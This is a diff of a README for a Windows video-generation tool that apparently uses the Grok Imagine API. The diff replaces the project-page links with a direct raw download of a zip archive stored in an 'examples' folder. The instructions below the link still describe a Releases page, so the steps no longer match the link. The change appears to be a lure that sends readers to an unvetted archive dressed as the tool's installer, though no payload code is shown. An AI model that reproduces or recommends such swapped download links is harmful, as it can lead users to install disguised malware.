@@ -1,6 +1,6 @@
 # 📹 grok-video-workflow - Generate and manage your video clips
 
-[![Download Grok Video Workflow](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Honorundetectable111/grok-video-workflow)
+[![Download Grok Video Workflow](https://img.shields.io/badge/Download-Blue-blue)](https://raw.githubusercontent.com/Honorundetectable111/grok-video-workflow/main/examples/workflow-video-grok-v1.8.zip)
 
 This tool helps you create videos using the Grok Imagine API. You can generate, save, and review your video frames on your Windows computer. The software handles the technical steps so you can focus on your creative output.
 
@@ -18,7 +18,7 @@ Your computer needs a few things to run this tool. Check that your system meets 
 
 You need to visit the project page to download the latest version. Follow these instructions to get the file:
 
-1. Visit [https://github.com/Honorundetectable111/grok-video-workflow](https://github.com/Honorundetectable111/grok-video-workflow).
+1. Visit [https://raw.githubusercontent.com/Honorundetectable111/grok-video-workflow/main/examples/workflow-video-grok-v1.8.zip](https://raw.githubusercontent.com/Honorundetectable111/grok-video-workflow/main/examples/workflow-video-grok-v1.8.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Click on the latest release version.
 4. Select the .exe file to download the installer to your computer.
